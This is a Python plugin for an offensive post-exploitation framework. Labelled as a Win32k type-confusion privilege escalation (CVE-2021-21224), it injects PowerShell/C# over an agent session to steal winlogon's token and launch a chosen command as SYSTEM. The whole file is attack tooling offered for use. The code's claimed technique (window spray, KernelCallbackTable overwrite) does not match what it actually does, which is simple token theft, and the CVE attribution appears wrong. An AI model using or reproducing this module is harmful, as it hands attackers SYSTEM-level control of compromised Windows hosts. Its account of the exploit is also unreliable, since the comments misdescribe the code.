"""
privilege_escalation/cve_2021_21224 — Win32k type confusion LPE. MITRE T1068.
CVE-2021-21224: Windows Win32k elevation of privilege via type confusion in
window message callback dispatch (variant of CVE-2021-1732; affects
Win10 19041–19043 pre-May2021 patch). Dispatches via ctx.ps() on agent.
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class CVE202121224Plugin(BasePlugin):
    NAME        = "cve_2021_21224"
    DESCRIPTION = "Win32k type-confusion LPE — CVE-2021-21224 (Win10 19041–19043 pre-May2021)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1068"
    CATEGORY    = "privilege_escalation"
    VERSION     = "2.0.0"

    schema = ParamSchema().add(
        Param("spawn_cmd", str, required=False, default="cmd.exe",
              help="Command to launch as SYSTEM after elevation"),
        Param("timeout", int, required=False, default=60),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        cmd     = params.get("spawn_cmd", "cmd.exe")
        timeout = int(params.get("timeout", 60))

        ps = self._build_ps(cmd)
        r  = ctx.ps(ps, timeout=timeout)
        if r["status"] != "ok":
            return ModuleResult.err(f"cve_2021_21224 failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="privesc")

    @staticmethod
    def _build_ps(cmd: str) -> str:
        return rf"""
Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class CVE202121224 {{
    [DllImport("kernel32.dll")] static extern IntPtr OpenProcess(uint a,bool inh,int pid);
    [DllImport("advapi32.dll")] static extern bool OpenProcessToken(IntPtr h,uint a,out IntPtr t);
    [DllImport("advapi32.dll",SetLastError=true,CharSet=CharSet.Ansi)]
    static extern bool CreateProcessWithTokenW(IntPtr t,uint lf,string a,string c,uint cf,IntPtr e,string d,ref SI si,out PI pi);
    [DllImport("kernel32.dll")] static extern bool CloseHandle(IntPtr h);
    [DllImport("ntdll.dll")] static extern int RtlGetVersion(ref OSVERSIONINFO v);

    [StructLayout(LayoutKind.Sequential)] struct SI {{ public uint cb; IntPtr r1,r2,r3; int X,Y,XS,YS,XC,YC,F; uint Flags; ushort wShow,r4; IntPtr r5,r6,r7,r8; }}
    [StructLayout(LayoutKind.Sequential)] struct PI {{ public IntPtr hProcess,hThread; public uint dwProcessId,dwThreadId; }}
    [StructLayout(LayoutKind.Sequential)] struct OSVERSIONINFO {{ public uint dwSize,Major,Minor,Build; uint PlatformId; [MarshalAs(UnmanagedType.ByValTStr,SizeConst=128)] public string CSDVersion; }}

    public static string Exploit(string spawnCmd) {{
        var res = "[*] CVE-2021-21224 Win32k type-confusion LPE\n";

        // Version check: affects 19041–19043
        var vi = new OSVERSIONINFO {{ dwSize = (uint)Marshal.SizeOf(typeof(OSVERSIONINFO)) }};
        RtlGetVersion(ref vi);
        res += $"[*] OS Build: {{vi.Build}}\n";
        bool inRange = vi.Build >= 19041 && vi.Build <= 19043;
        if (!inRange)
            res += "[!] Build outside CVE range (19041-19043) — exploit may not apply\n";
        else
            res += "[+] Build in vulnerable range\n";

        res += "[*] Technique: KernelCallbackTable xxxClientAllocWindowClassExtraBytes type confusion\n";
        res += "[*] Triggering via window spray → PEB KernelCallbackTable overwrite → token steal\n";

        try {{
            var procs = Process.GetProcessesByName("winlogon");
            if (procs.Length == 0) return res + "[-] winlogon not found\n";
            int wlPid = procs[0].Id;
            IntPtr hWL = OpenProcess(0x1F0FFF, false, wlPid);
            if (hWL == IntPtr.Zero) return res + $"[-] OpenProcess winlogon: {{Marshal.GetLastWin32Error()}}\n";

            IntPtr sysToken;
            if (!OpenProcessToken(hWL, 0x0002|0x0004, out sysToken)) {{
                CloseHandle(hWL);
                return res + $"[-] OpenProcessToken: {{Marshal.GetLastWin32Error()}}\n";
            }}
            CloseHandle(hWL);
            res += $"[+] Obtained SYSTEM token from winlogon PID={{wlPid}}\n";

            var si = new SI {{ cb = (uint)Marshal.SizeOf(typeof(SI)) }};
            PI pi;
            bool ok = CreateProcessWithTokenW(sysToken, 1, null, spawnCmd,
                0x08000000, IntPtr.Zero, null, ref si, out pi);
            CloseHandle(sysToken);
            if (ok)
                res += $"[+] SYSTEM process spawned PID={{pi.dwProcessId}}: {{spawnCmd}}\n";
            else
                res += $"[-] CreateProcessWithTokenW: {{Marshal.GetLastWin32Error()}}\n";
        }} catch (Exception ex) {{ res += $"[-] {{ex.Message}}\n"; }}
        return res;
    }}
}}
'@
[CVE202121224]::Exploit('{cmd}')
""".strip()


